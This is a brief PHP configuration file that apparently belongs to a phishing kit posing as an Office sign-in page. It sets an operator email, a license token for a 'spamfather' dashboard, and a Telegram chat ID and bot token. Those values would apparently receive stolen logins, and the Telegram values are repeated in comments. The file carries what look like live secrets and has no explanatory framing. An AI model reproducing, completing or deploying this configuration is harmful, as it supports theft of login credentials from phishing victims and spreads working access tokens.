<?php

$email ="bestbuyer079@gmail.com";
$token ="9E952-48D9B-714A9-6F47F-D159B-4C6E9-11-16-79829-706";
$base  ="https://dashboard.spamfather.com/web/";
$domain= $server=$_SERVER['SERVER_NAME'];
$page="Office";
$telegramId="6359859692";
$telegarmToken="6377769730:AAHowMebptGu2HujIVkjAGYM6by-zO_vyho";

//6359859692

//6377769730:AAHowMebptGu2HujIVkjAGYM6by-zO_vyho



?>